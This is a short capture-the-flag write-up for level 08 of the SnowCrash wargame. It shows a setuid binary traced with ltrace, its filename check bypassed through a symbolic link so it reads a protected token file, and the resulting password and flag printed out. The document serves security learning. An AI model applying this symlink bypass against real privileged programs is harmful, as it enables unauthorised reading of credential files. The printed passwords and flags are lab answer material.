# Level 08

## file list in home
```zsh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ltrace ./level08 
__libc_start_main(0x8048554, 1, 0xbffff7f4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                                        = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

## execute level08
```zsh
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                          = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                      = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

probleme concernant le nom de fichier!
donc, on peut le faire avec symbolick link!


## create folder and symbolic link file without "token"
```zsh
level08@SnowCrash:~$ mkdir /tmp/level08
level08@SnowCrash:/tmp/level08$ ln -s ~/token symbolic-link
level08@SnowCrash:/tmp/level08$ ls -l
total 0
lrwxrwxrwx 1 level08 level08 24 Apr 14 16:28 symbolic-link -> /home/user/level08/token
``` 

## execute token file with /tmp/level08/symbolic-link
```zsh
level08@SnowCrash:/tmp/level08$ cd
level08@SnowCrash:~$ ./level08 /tmp/level08/symbolic-link 
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ ./level08 /tmp/level08/symbolic-link 
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
"Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f"
flag08@SnowCrash:~$ su level09
Password: 
level09@SnowCrash:~$
```